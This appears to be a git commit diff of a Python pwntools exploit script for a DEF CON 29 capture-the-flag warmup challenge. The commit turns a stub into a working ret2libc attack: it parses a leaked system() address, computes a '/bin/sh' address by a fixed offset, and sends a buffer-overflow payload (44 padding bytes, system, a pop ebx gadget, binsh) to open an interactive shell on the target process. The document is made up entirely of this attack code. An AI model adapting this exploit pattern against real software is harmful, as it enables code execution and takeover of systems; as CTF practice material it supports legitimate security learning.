a56a9f2725d2853a0ee4ed676ae7629b871318f0
fresh <fr3shnuts@gmail.com>
2021-08-13 03:07:26 -0700

    Updated

--- defcon29/redhat_village_ctf/warmup/x_warmup.py
+++ defcon29/redhat_village_ctf/warmup/x_warmup.py
@@ -1,14 +1,27 @@
 from pwn import *
+
 # Load Context, binary, libc
 context.terminal = ['tmux','splitw' ,'-h']
 
-pop_ebx = 0x0804901e
+p = process('./target')
+#p = gdb.debug('./target', '''
+#break main
+#break vuln
+#''')
 
-p = gdb.debug('./target')
+p.recvuntil('system @ ')
+system_leak = int(p.recv(10), 16)
+
+print 'system() system_leak: ', hex(system_leak)
+
+pop_ebx = 0x0804901e
+binsh = system_leak + 1173467
 
 payload = ''
 payload += 'A' * 44
-payload += 'B' * 4
+payload += p32(system_leak)
+payload += p32(pop_ebx)
+payload += p32(binsh)
 
 p.sendline(payload)
 p.interactive()
